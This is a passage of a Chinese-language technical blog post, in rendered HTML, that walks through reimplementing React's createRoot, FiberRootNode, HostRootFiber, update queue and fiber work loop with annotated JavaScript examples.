class=\"name\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> root = <span class=\"title function_\">createRoot</span>(<span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">'root'</span>));</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(root)</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<p>首先要建一个 <code>FiberRootNode</code> 根节点，也就是所有 DOM 的根，本质就是 <code>div#root</code>。</p>\n<p>根节点和 <code>fiber</code> 关系：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/653b2a66c458853aef7f6122.jpg\" alt=\"根节点和`fiber`关系\"></p>\n<p><code>FiberRootNode</code> 和 <code>HostRootFiber</code> 中间使用 <code>current</code> 相连；</p>\n<p><code>HostRootFiber</code> 和 <code>FiberRootNode</code> 中间使用 <code>stateNode</code> 相连。</p>\n<h4 id=\"实现createRoot\"><a href=\"#实现createRoot\" class=\"headerlink\" title=\"实现createRoot\"></a>实现 createRoot</h4><p>分这么多文件的主要是因为很多其他逻辑要处理，暂时都给省略了。虽然比较绕，但其实本质就是把 <code>div#root</code> 做了几层包装。</p>\n<ol>\n<li><p>client.js</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">export</span> { createRoot } <span class=\"keyword\">from</span> <span class=\"string\">\"./src/client/ReactDOMRoot\"</span>;</span><br></pre></td></tr></tbody></table></figure>\n</li>\n<li><p>ReactDOMRoot.js</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> { createContainer } <span class=\"keyword\">from</span> <span class=\"string\">\"react-reconciler/src/ReactFiberReconciler\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">ReactDOMRoot</span>(<span class=\"params\">internalRoot</span>) {</span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">_internalRoot</span> = internalRoot;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 创建一个根 实际就是一个被包装过的真实DOM节点</span></span><br><span class=\"line\"><span class=\"comment\">// container: div#root</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">createRoot</span>(<span class=\"params\">container</span>) {</span><br><span class=\"line\"><span class=\"comment\">// 1. 创建容器   6. 接收到有#root的容器</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> root = <span class=\"title function_\">createContainer</span>(container);</span><br><span class=\"line\"><span class=\"comment\">// 7. 容器传给 ReactDOMRoot</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ReactDOMRoot</span>(root);</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n</li>\n<li><p>ReactFiberReconciler.js</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> { createFiberRoot } <span class=\"keyword\">from</span> <span class=\"string\">\"./ReactFiberRoot\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 创建容器 containerInfo: 容器信息</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">createContainer</span>(<span class=\"params\">containerInfo</span>) {</span><br><span class=\"line\"><span class=\"comment\">// 2</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"title function_\">createFiberRoot</span>(containerInfo);</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n</li>\n<li><p>ReactFiberRoot.js</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">FiberRootNode</span>(<span class=\"params\">containerInfo</span>) {</span><br><span class=\"line\"><span class=\"comment\">// 4. 把DOM节点放到容器</span></span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">containerInfo</span> = containerInfo</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">createFiberRoot</span>(<span class=\"params\">containerInfo</span>) {</span><br><span class=\"line\"><span class=\"comment\">// 3. 创建根容器</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> root = <span class=\"keyword\">new</span> <span class=\"title class_\">FiberRootNode</span>(containerInfo);</span><br><span class=\"line\"><span class=\"comment\">// 这个位置在下一步要创建 FiberRoot</span></span><br><span class=\"line\"><span class=\"comment\">// 5. 把容器返回出去</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> root;</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure></li>\n</ol>\n<p>现在根节点 <code>FiberRootNode</code> 创建好了，最后 <code>root</code> 的打印结果：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/653b2e66c458853aef8a195c.jpg\" alt=\"FiberRootNode\"></p>\n<h4 id=\"fiber\"><a href=\"#fiber\" class=\"headerlink\" title=\"fiber\"></a>fiber</h4><p>在创建根 fiber 之前先了解一下 fiber</p>\n<h4 id=\"为什么需要有fiber？\"><a href=\"#为什么需要有fiber？\" class=\"headerlink\" title=\"为什么需要有fiber？\"></a>为什么需要有 fiber？</h4><ul>\n<li>react 以前没有 fiber 整个计算过程不能暂停，会导致时间过长</li>\n<li>浏览器刷新频率为 60Hz, 大概 16.6 毫秒渲染一次，而 JS 线程和渲染线程是互斥的，所以如果 JS 线程执行任务时间超过 16.6ms 的话，就会导致掉帧、卡顿，解决方案就是 React 利用空闲的时间进行更新，不影响渲染进行的渲染</li>\n<li>把一个耗时任务切分成一个个小任务，分布在每一帧里。这个的方式就叫时间切片</li>\n</ul>\n<p>我们需要把渲染变成一个可中断，可暂停，可恢复的过程。<br>注：可以去搜一下 requestIdleCallback API ，react 封装了一个类似的方法让每帧时间固定 5ms。</p>\n<h4 id=\"什么是fiber？\"><a href=\"#什么是fiber？\" class=\"headerlink\" title=\"什么是fiber？\"></a>什么是 fiber？</h4><ul>\n<li><p>Fiber 是一个执行单元</p>\n<p>  Fiber 是一个执行单元，每次执行完一个执行单元，React 就会检查现在还剩多少时间，如果没有时间就将控制权让出去。</p>\n<p>  react 中一帧的过程：</p>\n<p>  <img data-src=\"https://pic.imgdb.cn/item/653b551cc458853aef02aa5f.jpg\" alt=\"react 中一帧的过程\"></p>\n</li>\n<li><p>Fiber 是一种数据结构<br>  React 目前的做法是使用链表，每个虚拟节点内部表示为一个 Fiber<br>  从顶点开始遍历<br>  如果有第一个儿子，先遍历第一个儿子<br>  如果没有第一个儿子，标志着此节点遍历完成<br>  如果有弟弟遍历弟弟<br>  如果有没有下一个弟弟，返回父节点标识完成父节点遍历，如果有叔叔遍历叔叔<br>  没有父节点遍历结束</p>\n<p>  遍历结构：<br>  <img data-src=\"https://pic.imgdb.cn/item/653b55d2c458853aef05059f.jpg\" alt=\"遍历结构\"></p>\n<p>  遍历过程：<br>  <img data-src=\"https://pic.imgdb.cn/item/653b55f9c458853aef0589a3.jpg\" alt=\"遍历过程\"></p>\n</li>\n</ul>\n<h4 id=\"创建根fiber\"><a href=\"#创建根fiber\" class=\"headerlink\" title=\"创建根fiber\"></a>创建根 fiber</h4><p>真实 DOM 需要一个根容器，<code>fiber</code> 同样需要一个根 <code>fiber</code>。</p>\n<p>相当于每个虚拟 DOM 都会创建一个对应的 <code>Fiber</code>，再创建真实 DOM</p>\n<p>虚拟 DOM =&gt; Fiber =&gt; 真实 DOM</p>\n<p>在刚刚创建 FiberRootNode 的函数里去创建 <code>HostRootFiber</code> 并互相指向对方。</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/653b2a66c458853aef7f6122.jpg\" alt=\"根节点和`fiber`关系\"></p>\n<ol>\n<li><p>ReactFiberRoot.js</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> { createHostRootFiber } <span class=\"keyword\">from</span> <span class=\"string\">\"./ReactFiber\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">FiberRootNode</span>(<span class=\"params\">containerInfo</span>) {</span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">containerInfo</span> = containerInfo;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">createFiberRoot</span>(<span class=\"params\">containerInfo</span>) {</span><br><span class=\"line\"><span class=\"comment\">// 之前创建的根节点容器</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> root = <span class=\"keyword\">new</span> <span class=\"title class_\">FiberRootNode</span>(containerInfo);</span><br><span class=\"line\"><span class=\"comment\">// 1. 创建根fiber. hostRoot就是根节点dev#root</span></span><br><span class=\"line\"><span class=\"comment\">// 未初始化的fiber</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> uninitializedFiber = <span class=\"title function_\">createHostRootFiber</span>();</span><br><span class=\"line\"><span class=\"comment\">// 当前渲染页面的fiber.</span></span><br><span class=\"line\"><span class=\"comment\">// 6. 根容器的current指向当前的根fiber</span></span><br><span class=\"line\">root.<span class=\"property\">current</span> = uninitializedFiber;</span><br><span class=\"line\">uninitializedFiber.<span class=\"property\">stateNode</span> = root;</span><br><span class=\"line\"><span class=\"keyword\">return</span> root;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n</li>\n<li><p>ReactFiber.js</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 3. 工作标签</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> { <span class=\"title class_\">HostRoot</span> } <span class=\"keyword\">from</span> <span class=\"string\">\"./ReactWorkTags\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 5. 副作用标识</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> { <span class=\"title class_\">NoFlags</span> } <span class=\"keyword\">from</span> <span class=\"string\">\"./ReactFiberFlags\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">FiberNode</span>(<span class=\"params\">tag, pendingProps, key</span>) {</span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">tag</span> = tag;</span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">key</span> = key;</span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">type</span> = <span class=\"literal\">null</span>; <span class=\"comment\">// fiber类型, 来自于虚拟DOM节点的type   (span h1 p)</span></span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">stateNode</span> = <span class=\"literal\">null</span>; <span class=\"comment\">// 此fiber对应的真实DOM节点</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">return</span> = <span class=\"literal\">null</span>; <span class=\"comment\">// 指向父节点</span></span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">child</span> = <span class=\"literal\">null</span>; <span class=\"comment\">// 指向第一个子节点</span></span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">sibling</span> = <span class=\"literal\">null</span>; <span class=\"comment\">// 指向弟弟</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">pendingProps</span> = pendingProps; <span class=\"comment\">// 等待生效的属性</span></span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">memoizedProps</span> = <span class=\"literal\">null</span>; <span class=\"comment\">// 已经生效的属性</span></span><br><span class=\"line\"><span class=\"comment\">// 虚拟DOM会提供pendingProps给创建fiber的属性，等处理完复制给memoizedProps</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 每个fiber还会有自己的状态，每一种fiber状态存的类型都不一样</span></span><br><span class=\"line\"><span class=\"comment\">// 比如：类组件对应的fiber存的就是实例的状态，HostRoot存的就是要渲染的元素</span></span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">memoizedState</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 每个fiber可能还有自己的更新队列</span></span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">updateQueue</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 5. \"./ReactFiberFlags\"</span></span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">flags</span> = <span class=\"title class_\">NoFlags</span>; <span class=\"comment\">// 副作用标识，表示对此fiber节点进行何种操作</span></span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">subtreeFlags</span> = <span class=\"title class_\">NoFlags</span>; <span class=\"comment\">// 子节点对应的副作用标识</span></span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">alternate</span> = <span class=\"literal\">null</span>; <span class=\"comment\">// 轮替 (缓存了另一个fiber节点实例) diff时用</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">createFiberNode</span>(<span class=\"params\">tag, pendingProps, key</span>) {</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FiberNode</span>(tag, pendingProps, key);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">createHostRootFiber</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"title function_\">createFiberNode</span>(<span class=\"title class_\">HostRoot</span>, <span class=\"literal\">null</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n</li>\n<li><p>ReactWorkTags.js</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 每种虚拟DOM都会对应自己的fiber的类型</span></span><br><span class=\"line\"><span class=\"comment\">// 根Fiber的Tag</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> <span class=\"title class_\">HostRoot</span> = <span class=\"number\">3</span>; <span class=\"comment\">// 根节点</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> <span class=\"title class_\">HostComponent</span> = <span class=\"number\">5</span>; <span class=\"comment\">// 原生节点 span div p</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> <span class=\"title class_\">HostText</span> = <span class=\"number\">6</span>; <span class=\"comment\">// 纯文本节点</span></span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n</li>\n<li><p>ReactFiberFlags.js</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 没有任何操作</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> <span class=\"title class_\">NoFlags</span> = <span class=\"number\">0b000000000000000000000000000000</span>;</span><br><span class=\"line\"><span class=\"comment\">// 插入</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> <span class=\"title class_\">Placement</span> = <span class=\"number\">0b000000000000000000000000000010</span>;</span><br><span class=\"line\"><span class=\"comment\">// 更新</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> <span class=\"title class_\">Update</span> = <span class=\"number\">0b000000000000000000000000000100</span>;</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n<p>看最后 root 的打印结果：根 fiber 和节点容器互相指向</p>\n</li>\n</ol>\n<p><img data-src=\"https://pic.imgdb.cn/item/653b5beac458853aef1a1a12.jpg\" alt=\"根fiber和节点容器互相指向\"></p>\n<pre><code>current指的是当前根容器正在显示或者已经渲染好的fiber树\n</code></pre>\n<p>react 采用了双缓存区的技术，可以把将要显示的图片绘制在缓存区中，需要展示的时候直接拿来替换掉。 alternate 轮替。</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/653bc1f2c458853aefb79377.jpg\"></p>\n<h4 id=\"创建队列\"><a href=\"#创建队列\" class=\"headerlink\" title=\"创建队列\"></a>创建队列</h4><p>打开 ReactFiberRoot.js 文件，在 return root 之前加一行代码，给根 fiber 加上一个更新队列，之后更新渲染任务都是放到这个队列里面。</p>\n<ol>\n<li><p>ReactFiberRoot.js</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">+ <span class=\"keyword\">import</span> { initialUpdateQueue } <span class=\"keyword\">from</span> <span class=\"string\">\"./ReactFiberClassUpdateQueue\"</span>;</span><br><span class=\"line\">...</span><br><span class=\"line\">+ <span class=\"title function_\">initialUpdateQueue</span>(uninitializedFiber);</span><br><span class=\"line\"><span class=\"keyword\">return</span> root;</span><br></pre></td></tr></tbody></table></figure>\n</li>\n<li><p>ReactFiberClassUpdateQueue.js</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">initialUpdateQueue</span>(<span class=\"params\">fiber</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// 创建一个更新队列</span></span><br><span class=\"line\">    <span class=\"comment\">// pending 是循环链表</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> queue = {</span><br><span class=\"line\">        <span class=\"attr\">shared</span>: {</span><br><span class=\"line\">            <span class=\"attr\">pending</span>: <span class=\"literal\">null</span>,</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">    fiber.<span class=\"property\">updateQueue</span> = queue;</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure></li>\n</ol>\n<p>如下图所示在 fiber 树中增加了 updateQueue 队列</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/653bc2bdc458853aefbd2de4.jpg\" alt=\"updateQueue 队列\"></p>\n<h3 id=\"构建轮替的根fiber\"><a href=\"#构建轮替的根fiber\" class=\"headerlink\" title=\"构建轮替的根fiber\"></a>构建轮替的根 fiber</h3><h4 id=\"fiber是怎么运作的\"><a href=\"#fiber是怎么运作的\" class=\"headerlink\" title=\"fiber是怎么运作的\"></a>fiber 是怎么运作的</h4><pre><code>为什么要轮替在上一篇已经说过了，这一篇写一下fiber的单项循环链表。\n</code></pre>\n<p>假如我们有一个 jsx 的 dom 结构</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> element = (</span><br><span class=\"line\">    <span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">className</span>=<span class=\"string\">\"A1\"</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">className</span>=<span class=\"string\">\"B1\"</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">            <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">className</span>=<span class=\"string\">\"C1\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">            <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">className</span>=<span class=\"string\">\"C2\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">        <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">className</span>=<span class=\"string\">\"B2\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<p>在以前没有用 fiber 渲染是这样的，这个渲染方式是递归渲染如果数据很多就可能会卡顿。</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> vDom = {</span><br><span class=\"line\">    <span class=\"string\">\"type\"</span>: <span class=\"string\">\"div\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"A1\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"props\"</span>: {</span><br><span class=\"line\">        <span class=\"string\">\"className\"</span>: <span class=\"string\">\"A1\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"children\"</span>: [</span><br><span class=\"line\">            {</span><br><span class=\"line\">                <span class=\"string\">\"type\"</span>: <span class=\"string\">\"div\"</span>,</span><br><span class=\"line\">                <span class=\"string\">\"key\"</span>: <span class=\"string\">\"B1\"</span>,</span><br><span class=\"line\">                <span class=\"string\">\"props\"</span>: {</span><br><span class=\"line\">                    <span class=\"string\">\"className\"</span>: <span class=\"string\">\"B1\"</span>,</span><br><span class=\"line\">                    <span class=\"string\">\"children\"</span>: [</span><br><span class=\"line\">                        {</span><br><span class=\"line\">                            <span class=\"string\">\"type\"</span>: <span class=\"string\">\"div\"</span>,</span><br><span class=\"line\">                            <span class=\"string\">\"key\"</span>: <span class=\"string\">\"C1\"</span>,</span><br><span class=\"line\">                            <span class=\"string\">\"props\"</span>: { <span class=\"string\">\"className\"</span>: <span class=\"string\">\"C1\"</span>},</span><br><span class=\"line\">                        },</span><br><span class=\"line\">                        {</span><br><span class=\"line\">                            <span class=\"string\">\"type\"</span>: <span class=\"string\">\"div\"</span>,</span><br><span class=\"line\">                            <span class=\"string\">\"key\"</span>: <span class=\"string\">\"C2\"</span>,</span><br><span class=\"line\">                            <span class=\"string\">\"props\"</span>: {<span class=\"string\">\"className\"</span>: <span class=\"string\">\"C2\"</span>},</span><br><span class=\"line\">                        }</span><br><span class=\"line\">                    ]</span><br><span class=\"line\">                },</span><br><span class=\"line\">            },</span><br><span class=\"line\">            {</span><br><span class=\"line\">                <span class=\"string\">\"type\"</span>: <span class=\"string\">\"div\"</span>,</span><br><span class=\"line\">                <span class=\"string\">\"key\"</span>: <span class=\"string\">\"B2\"</span>,</span><br><span class=\"line\">                <span class=\"string\">\"props\"</span>: {<span class=\"string\">\"className\"</span>: <span class=\"string\">\"B2\"</span>},</span><br><span class=\"line\">            }</span><br><span class=\"line\">        ]</span><br><span class=\"line\">    },</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 把vDom一气呵成渲染到页面</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">render</span>(<span class=\"params\">element, container</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// 把虚拟DOM创建成真实DOM</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> dom = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElement</span>(element.<span class=\"property\">type</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 遍历属性</span></span><br><span class=\"line\">    <span class=\"title class_\">Object</span>.<span class=\"title function_\">keys</span>(element.<span class=\"property\">props</span>).<span class=\"title function_\">filter</span>(<span class=\"function\"><span class=\"params\">key</span> =&gt;</span> key !== <span class=\"string\">'children'</span>).<span class=\"title function_\">forEach</span>(<span class=\"function\"><span class=\"params\">key</span> =&gt;</span> {</span><br><span class=\"line\">        dom[key] = element.<span class=\"property\">props</span>[key];</span><br><span class=\"line\">    });</span><br><span class=\"line\">    <span class=\"comment\">// 把子节点渲染到父节点上</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title class_\">Array</span>.<span class=\"title function_\">isArray</span>(element.<span class=\"property\">props</span>.<span class=\"property\">children</span>)){</span><br><span class=\"line\">        element.<span class=\"property\">props</span>.<span class=\"property\">children</span>.<span class=\"title function_\">forEach</span>(<span class=\"function\"><span class=\"params\">child</span>=&gt;</span><span class=\"title function_\">render</span>(child,dom));</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\">// 把真实节点挂载到容器</span></span><br><span class=\"line\">    container.<span class=\"title function_\">appendChild</span>(dom);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"title function_\">render</span>(element, <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">'root'</span>));</span><br></pre></td></tr></tbody></table></figure>\n\n<p>下面是 fiber 的渲染方式，可以中断、暂停、恢复渲染。深度优先</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 把虚拟DOM构建成Fiber树</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"variable constant_\">A1</span> = { <span class=\"attr\">type</span>: <span class=\"string\">'div'</span>, <span class=\"attr\">props</span>: { <span class=\"attr\">className</span>: <span class=\"string\">'A1'</span> } };</span><br><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"variable constant_\">B1</span> = { <span class=\"attr\">type</span>: <span class=\"string\">'div'</span>, <span class=\"attr\">props</span>: { <span class=\"attr\">className</span>: <span class=\"string\">'B1'</span> }, <span class=\"attr\">return</span>: <span class=\"variable constant_\">A1</span> };</span><br><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"variable constant_\">B2</span> = { <span class=\"attr\">type</span>: <span class=\"string\">'div'</span>, <span class=\"attr\">props</span>: { <span class=\"attr\">className</span>: <span class=\"string\">'B2'</span> }, <span class=\"attr\">return</span>: <span class=\"variable constant_\">A1</span> };</span><br><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"variable constant_\">C1</span> = { <span class=\"attr\">type</span>: <span class=\"string\">'div'</span>, <span class=\"attr\">props</span>: { <span class=\"attr\">className</span>: <span class=\"string\">'C1'</span> }, <span class=\"attr\">return</span>: <span class=\"variable constant_\">B1</span> };</span><br><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"variable constant_\">C2</span> = { <span class=\"attr\">type</span>: <span class=\"string\">'div'</span>, <span class=\"attr\">props</span>: { <span class=\"attr\">className</span>: <span class=\"string\">'C2'</span> }, <span class=\"attr\">return</span>: <span class=\"variable constant_\">B1</span> };</span><br><span class=\"line\"><span class=\"variable constant_\">A1</span>.<span class=\"property\">child</span> = <span class=\"variable constant_\">B1</span>;</span><br><span class=\"line\"><span class=\"variable constant_\">B1</span>.<span class=\"property\">sibling</span> = <span class=\"variable constant_\">B2</span>;</span><br><span class=\"line\"><span class=\"variable constant_\">B1</span>.<span class=\"property\">child</span> = <span class=\"variable constant_\">C1</span>;</span><br><span class=\"line\"><span class=\"variable constant_\">C1</span>.<span class=\"property\">sibling</span> = <span class=\"variable constant_\">C2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 下一个工作单元</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> nextUnitOfWork = <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">hasRemainingTime</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"comment\">// 模拟有时间</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// render 工作循序</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">workLoop</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"comment\">// 有下一个节点并且有时间时</span></span><br><span class=\"line\">    <span class=\"comment\">// 每一个任务执行完都可以放弃，让浏览器执行更高优先级的任务</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span>(nextUnitOfWork &amp;&amp; <span class=\"title function_\">hasRemainingTime</span>()) {</span><br><span class=\"line\">        <span class=\"comment\">// 执行下一个任务并返回下一个任务</span></span><br><span class=\"line\">        nextUnitOfWork = <span class=\"title function_\">performUnitOfWork</span>(fiber);</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'render 阶段结束\");</span></span><br><span class=\"line\"><span class=\"string\">}</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">// 执行完后返回下一个节点</span></span><br><span class=\"line\"><span class=\"string\">function performUnitOfWork(fiber) {</span></span><br><span class=\"line\"><span class=\"string\">    // 执行渲染</span></span><br><span class=\"line\"><span class=\"string\">    let child = beginWork(fiber);</span></span><br><span class=\"line\"><span class=\"string\">    if(child) {</span></span><br><span class=\"line\"><span class=\"string\">        return child;</span></span><br><span class=\"line\"><span class=\"string\">    }</span></span><br><span class=\"line\"><span class=\"string\">    // 如果没有子节点说明当前节点已经完成了渲染工作</span></span><br><span class=\"line\"><span class=\"string\">    while(fiber) {</span></span><br><span class=\"line\"><span class=\"string\">        // 可以结束此fiber的渲染了 </span></span><br><span class=\"line\"><span class=\"string\">        completeUnitOfWork(fiber);</span></span><br><span class=\"line\"><span class=\"string\">        // 如果有弟弟就返回弟弟</span></span><br><span class=\"line\"><span class=\"string\">        